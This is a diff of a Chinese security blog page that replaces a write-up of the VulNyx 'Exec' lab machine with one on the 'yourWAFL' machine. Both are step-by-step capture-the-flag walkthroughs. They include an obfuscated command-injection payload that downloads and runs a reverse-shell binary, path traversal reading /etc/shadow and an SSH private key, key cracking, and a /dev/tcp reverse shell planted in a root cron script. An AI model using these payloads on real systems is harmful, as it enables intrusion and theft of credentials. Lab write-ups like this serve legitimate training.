@@ -4,15 +4,18 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="VulNyx-Exec | 靶机, 网络安全 深度学习 ">
+    <meta name="keywords" content="VulNyx-yourWAFL | 靶机, 网络安全 深度学习 ">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="yCy2azpds5XSuGZvis6OuA-XIGF5GuGpYRAaGfD6o48">
     <meta name="360-site-verification" content="b7c11a830ef90fd1464ad6206bb7b6e7">
-    <meta name="description" content="
-arp-scan -l扫出目标ip192.168.193.130
-用nmap对ip进行快速扫描端口-sS使用tcp syn 扫描 -sV进行版本探测 -T5是快速扫描级别最高级  -A是全面扫描 -p-是端口扫描
+    <meta name="description" content="arp-scan -l扫除目标ip
+rustscan
+rustscan -a x.x.x.x -- -sV -sC
+看到个3000端口，试了一下好像是进不去的
+我们查看一下web请求
+curl x.x.x.x -I
 
-nmap -sS -s">
+看到是302响应跳转 ">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +23,7 @@ nmap -sS -s">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>VulNyx-Exec | 靶机 | JJFACQ的博客</title>
+    <title>VulNyx-yourWAFL | 靶机 | JJFACQ的博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -333,13 +336,13 @@ nmap -sS -s">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/23.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        VulNyx-Exec | 靶机
+                        VulNyx-yourWAFL | 靶机
                     </div>
                 </div>
             </div>
@@ -488,14 +491,14 @@ nmap -sS -s">
                 
                 <div class="info-break-policy">
                     <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    390
+                    1.3k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    1 分
+                    5 分
                 </div>
                 
                 
@@ -511,41 +514,123 @@ nmap -sS -s">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p><img src="/medias/%5Cfeatureimages%5C15.jpg" alt></p>
-<h1 id="arp-scan-l扫出目标ip"><a href="#arp-scan-l扫出目标ip" class="headerlink" title="arp-scan -l扫出目标ip"></a>arp-scan -l扫出目标ip</h1><p>192.168.193.130</p>
-<h1 id="用nmap对ip进行快速扫描端口"><a href="#用nmap对ip进行快速扫描端口" class="headerlink" title="用nmap对ip进行快速扫描端口"></a>用nmap对ip进行快速扫描端口</h1><p>-sS使用tcp syn 扫描 -sV进行版本探测 -T5是快速扫描级别最高级  -A是全面扫描 -p-是端口扫描</p>
-<blockquote>
-<p>nmap -sS -sV -T5 -A -p- 192.168.193.130</p>
-</blockquote>
-<p>扫描出22 80 139 445端口 ，有80端口，我们可以去浏览器看看有没有http网页，发现有html网页</p>
-<p>我们可以用smbclient来查看有什么共享的资源用</p>
-<blockquote>
-<p>smbclient -L //192.168.193.130</p>
-</blockquote>
-<p>看到有个server<br>让后可以用smbclient 与服务器进行交互连接</p>
-<blockquote>
-<p>smbclient //192.168.193.130/server</p>
-</blockquote>
-<h2 id="然后连接到smb服务器"><a href="#然后连接到smb服务器" class="headerlink" title="然后连接到smb服务器"></a>然后连接到smb服务器</h2><h2 id="然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a-php空文件，让后用kali自动生成进去一个"><a href="#然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a-php空文件，让后用kali自动生成进去一个" class="headerlink" title="然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a.php空文件，让后用kali自动生成进去一个"></a>然后我们看到这个服务器是可以上传文件的，这边我们随便在本地创建一个a.php空文件，让后用kali自动生成进去一个</h2><p>反弹webshell的a.php文件木马，</p>
-<blockquote>
-<p>/usr/share/webshells/php/php-reverse-shell a.php</p>
-</blockquote>
-<p>让后用连接的smb把木马文件上传</p>
-<blockquote>
-<p>put a.php</p>
-</blockquote>
-<h2 id="上传木马后，我们用nc-lp-1234-对目标进行监听"><a href="#上传木马后，我们用nc-lp-1234-对目标进行监听" class="headerlink" title="上传木马后，我们用nc -lp 1234 对目标进行监听"></a>上传木马后，我们用nc -lp 1234 对目标进行监听</h2><p>然后我们去浏览器，访问一下我们上传的木马<br>把shell反弹过来</p>
-<blockquote>
-<p>192.168.193.130/a.php<br>让后监听成功，可以用/usr/bin/script -qc /bin/bash /dev/null这个命令进入shell模式<br>/usr/bin/script -qc /bin/bash /dev/null</p>
-</blockquote>
-<p>然后我们使用</p>
-<blockquote>
-<p>sudo -l<br>看下换个身份执行命令看到（s3cur4）这个用户<br>然后我们用这个用户执行命令<br>sudo -us3cur4 bash</p>
-</blockquote>
-<h2 id="然后我们cd到家目录"><a href="#然后我们cd到家目录" class="headerlink" title="然后我们cd到家目录"></a>然后我们cd到家目录</h2><blockquote>
-<p>cd<br>ls<br>cat user.txt<br>看一下文件内容夺取成功</p>
-</blockquote>
+                <pre><code>arp-scan -l</code></pre><p>扫除目标ip</p>
+<p>rustscan</p>
+<pre><code>rustscan -a x.x.x.x -- -sV -sC</code></pre><p><img src="%5Cmedias%5Cfeatureimages%5Cimage-20240615002211131.png" alt="image-20240615002211131"></p>
+<p>看到个3000端口，试了一下好像是进不去的</p>
+<p>我们查看一下web请求</p>
+<p>curl x.x.x.x -I</p>
+<p><img src="%5Cmedias%5Cfeatureimages%5Cimage-20240615003156838.png" alt="image-20240615003156838"></p>
+<p>看到是302响应跳转 我们需要在/etc/hosts 下修改IP  domain</p>
+<pre><code>vi /etc/hosts</code></pre><p><img src="%5Cmedias%5Cfeatureimages%5Cimage-20240615003438025.png" alt="image-20240615003438025"></p>
+<h4 id="然后这边子域名扫描"><a href="#然后这边子域名扫描" class="headerlink" title="然后这边子域名扫描"></a>然后这边子域名扫描</h4><pre><code>ffuf -w  /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u &#39;http:www.yourwaf.nyx&#39; -H &quot;Host: FUZZ.yourwaf.nyx&quot; -H &quot;X-Originating-IP:127.0.0.1&quot; -H &quot;X-Forwarded-For: 127.0.0.1&quot; -H &quot;X-Remote-IP: 127.0.0.1&quot; --fc 302,403 -H &#39;User-Agent: Mozilla&#39;</code></pre><p>扫描出问题的话可以去看一下ffuf工具文档地址<a href="https://github.com/ffuf/ffuf" target="_blank" rel="noopener">https://github.com/ffuf/ffuf</a></p>
+<p>我们扫到一个maintenance子域名，还有个User-Agent: Mozilla</p>
+<p>然后把这个子域名添加到/etc/hosts 进行访问</p>
+<p><img src="%5Cmedias%5Cfeatureimages%5Cimage-20240615004540054.png" alt="image-20240615004540054"></p>
+<p>看到一个简单的表单，然后输入id测试一下发现好像是个命令执行页面</p>
+<p>让后我们可以利用命令执行反弹shell</p>
+<p>我们先生成一个revshell， 让后开启web服务</p>
+<p>去一个在线生成shell的一个网站<a href="https://www.revshells.com/" target="_blank" rel="noopener">Online - Reverse Shell Generator (revshells.com)</a></p>
+<pre><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=1234 -f elf -o reverse.elf</code></pre><p>然后kali 开启一个web服务</p>
+<pre><code>python3 -m http.server 80</code></pre><p>命令执行绕过指令</p>
+<p>语句拼接</p>
+<pre><code>IFS=];b=wget]192.168.193.128/shell.elf]-
+P]/tmp;$b;IFS=];c=chmod]+x]/tmp/shell.elf;$c;IFS=];d=/tmp/shell.elf;$d</code></pre><p>然后输入在命令行上面让web服务接收，接收后用</p>
+<pre><code>nc -lp 端口号</code></pre><p>然后在访问一次，然后输个id看看有没有回显，看到有然后我们查看一下有没有python3的脚本或路径</p>
+<pre><code>whereis python3</code></pre><p>看到/usr/bin/python3</p>
+<p>我们可以利用python的pty模块里的一个spawn函数启动一个可以与系统交互的伪终端，</p>
+<pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><p>然后获得FULL-TTY,查看一下控制字符</p>
+<pre><code>stty -a</code></pre><p>让后输入这条命令</p>
+<pre><code>stty raw -echo;fg;ls;export SHELL=/bin/bash;export TERM=screen;stty rows 28  columns 112 ;reset</code></pre><p>我们echo一下xterm终端看看，是xterm-256color</p>
+<pre><code>echo $TERM</code></pre><p>我们设置一下term环境变量设为这个</p>
+<pre><code>export TERM=xterm-256color</code></pre><p>然后我们用pspy这个工具具体用法看指南下载地址</p>
+<p><a href="https://github.com/DominicBreuker/pspy" target="_blank" rel="noopener">https://github.com/DominicBreuker/pspy</a></p>
+<p>下载好后我们去wget一下这个工具</p>
+<pre><code>wget http://192.168.193.128/pspy64</code></pre><p>试了一下好像不行需要提权一下</p>
+<pre><code>export TERM=xterm-256color</code></pre><p>先该一下环境变量</p>
+<pre><code>script /dev/null -qc /bin/bash</code></pre><p>最后reset</p>
+<pre><code>reset</code></pre><p>然后在wget一下</p>
+<pre><code>wget http://192.168.193.128/pspy64</code></pre><p>然后给这个文件提升一下权限然后运行</p>
+<pre><code>chmod +x pspy64 ./pspy64</code></pre><p><img src="%5Cmedias%5Cfeatureimages%5Cimage-20240616014446247.png" alt="image-20240616014446247"></p>
+<p>可以看到每隔一段时间就会运行/opt/nodeapp/copylogs.sh</p>
+<p>我们进这个目录去看一下</p>
+<pre><code>cd /opt/nodeapp/copylogs.sh</code></pre><pre><code>ps aux |grep node</code></pre><p>看到一个server.js文件可以cat来查看一下</p>
+<p><img src="%5Cmedias%5Cfeatureimages%5Cimage-20240616015205991.png" alt="image-20240616015205991"></p>
+<pre><code>cat server.js</code></pre><p>看到这个有个文件读取的漏洞</p>
+<pre><code>const express = require(&#39;express&#39;)
+const { exec } = require(&#39;child_process&#39;);
+var path = require(&#39;path&#39;);
 
+const app = express()
+const port = 3000
+
+const apiToken = &#39;8c2b6a304191b8e2d81aaa5d1131d83d&#39;;
+
+
+function checkApiToken(req, res, next) {
+  let sendApiToken = req.query[&quot;api-token&quot;] ?? &#39;&#39;;
+  if (apiToken !== sendApiToken) {
+    res.send(&quot;Unauthorized.&quot;)
+    return;
+  }
+  next();
+}
+
+app.use(&#39;/logs&#39;, (req, res) =&gt; {
+  let path_to_file = __dirname + &#39;/logs/modsec_audit.log&#39;
+  res.sendFile(path_to_file)
+})
+
+
+app.get(&#39;/&#39;, checkApiToken, (req, res) =&gt; {
+  res.send(&#39;API de mantenimiento!&#39;);
+})
+
+app.get(&#39;/restart&#39;, checkApiToken, (req, res) =&gt; {
+  exec(&#39;reboot&#39;, (error, stdout, stderr) =&gt; {
+    if (error) {
+      res.send(`exec error: ${error}`)
+      return;
+    }
+    res.send(&#39;Restarting server...&#39;);
+  });
+})
+
+app.get(&#39;/readfile&#39;, checkApiToken, (req, res) =&gt; {
+  let file = req.query[&quot;file&quot;] ?? &#39;&#39;;
+  if (file === &#39;&#39;) {
+    res.send(&#39;Error: need file&#39;)
+    return;
+  }
+  if (file.indexOf(&#39;passwd&#39;) !== -1) {
+    res.send(&#39;ForbiddenError: Forbidden&#39;)
+    return;
+  }
+  let path_to_file = __dirname + file
+  res.sendFile(path.resolve(path_to_file))
+})
+
+app.listen(port,  () =&gt; {
+  console.log(`Example app listening on port ${port}`)
+})</code></pre><pre><code>curl &#39;htto://192.168.193.143:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&amp;file=../../../../etc/shadow&#39;</code></pre><p>试了一下可以读取/etc/shaow说明是root权限，但是好像过滤了passwd字段，所以没有去度/passwd</p>
+<p>然后我们查看一下home发现一个tester文件应该是用户同样也存在/etc/passwd文件</p>
+<pre><code>ls /home/</code></pre><p>我们读取这个用户的私钥尝试登陆</p>
+<pre><code>curl &#39;htto://192.168.193.143:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&amp;file=../../../../home/tester/.ssh/id_rsa&#39;</code></pre><p>可以读取</p>
+<pre><code>curl &#39;htto://192.168.193.143:3000/readfile?api-token=8c2b6a304191b8e2d81aaa5d1131d83d&amp;file=../../../../home/tester/.ssh/id_rsa&#39; -o tester</code></pre><pre><code>ssh tester@192.168.193.143 -i tester</code></pre><pre><code>chmod 600 tester</code></pre><p>然后连接还是需要密码，我们不知道密码直接爆破试试</p>
+<pre><code>ssh2john tester &gt; testerhash</code></pre><pre><code>john testerhash</code></pre><p>爆破出来就可以直接登陆了</p>
+<p>登陆后id看一下没有啥</p>
+<p>继续使用pspy工具探测一下</p>
+<pre><code>wget http://192.168.193.128/pspy64.pspy64</code></pre><pre><code>chmod +x pspy64.pspy64</code></pre><pre><code>./pspy64.pspy64</code></pre><p><img src="%5Cmedias%5Cfeatureimages%5Cimage-20240616024542988.png" alt="image-20240616024542988"></p>
+<p>发现这个文件每隔一段时间就会执行一次，这个程序是root权限，但是我们当前用户拥有所属组的权限，可以进行修改这个文件反弹shell</p>
+<pre><code>cd /opt/nodeapp/</code></pre><pre><code>nano copylogs.sh</code></pre><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.193.128/8888 0&gt;&amp;1</code></pre><p>然后去监听等他文件自动执行登陆</p>
+<pre><code>python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></pre><pre><code>stty raw -echo;fg;export SHELL=/bin/bash;export TERM=xterm-256color;</code></pre><p>最后拿到flag  </p>
+<pre><code>stty -a
+
+stty rows 28  columns 98</code></pre><pre><code>cat user-afa83c8bac2338a439766f22e8245636.txt
+
+cat  root-e765ca897810e6e2da0e594113bfe9b3.txt
+
+</code></pre>
             </div>
             <hr />
 
@@ -703,9 +788,9 @@ nmap -sS -s">
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《VulNyx-Exec | 靶机》
+                    《VulNyx-yourWAFL | 靶机》
                 </span> 由
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2023/01/14/wp-2/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2023/01/14/yourwafl/" property="cc:attributionName"
                rel="cc:attributionURL">
                 JFQ
             </a> 采用
@@ -746,7 +831,7 @@ nmap -sS -s">
         repo: 'jjfacq.github.io',
         owner: 'jjfacq',
         admin: "jjfacq",
-        id: '2023/01/14/wp-2/',
+        id: '2023/01/14/yourwafl/',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -1033,6 +1118,56 @@ nmap -sS -s">
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
+                <a href="/2023/01/14/lwaq/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/26.jpg" class="responsive-img" alt="2024 | 网络安全">
+                        
+                        <span class="card-title">2024 | 网络安全</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+VPN 技术l VPN定义：虚拟专用网(Virtual Private Network)是一种“通过共享的公共网络建立私有的数据通道，将各个需要接入这张虚拟网的网络或终端通过通道连接起来，构成一个专用的、具有一定安全性和服务质量保证的网络
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2023-01-14
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/网络安全/" class="post-category" target="_blank">
+                                    网络安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/网络安全/" target="_blank">
+                        <span class="chip bg-color">网络安全</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
                 <a href="/2023/01/14/sqlzhuru/">
                     <div class="card-image">
                         
@@ -1060,9 +1195,9 @@ and或者or进行逻辑判断，是否可以执行逻辑
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2023-01-14
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2023-01-14
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -1075,60 +1210,6 @@ and或者or进行逻辑判断，是否可以执行逻辑
                         </span>
                     </div>
                 </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/渗透测试/" target="_blank">
-                        <span class="chip bg-color">渗透测试</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="fa fa-dot-circle-o"></i>
-            </div>
-            <div class="card">
-                <a href="/2023/01/14/wp-2/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="VulNyx-Exec | 靶机">
-                        
-                        <span class="card-title">VulNyx-Exec | 靶机</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-arp-scan -l扫出目标ip192.168.193.130
-用nmap对ip进行快速扫描端口-sS使用tcp syn 扫描 -sV进行版本探测 -T5是快速扫描级别最高级  -A是全面扫描 -p-是端口扫描
-
-nmap -sS -s
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2023-01-14
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/靶机打靶/" class="post-category" target="_blank">
-                                    靶机打靶
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-
                 
                 <div class="card-action article-tags">
                     
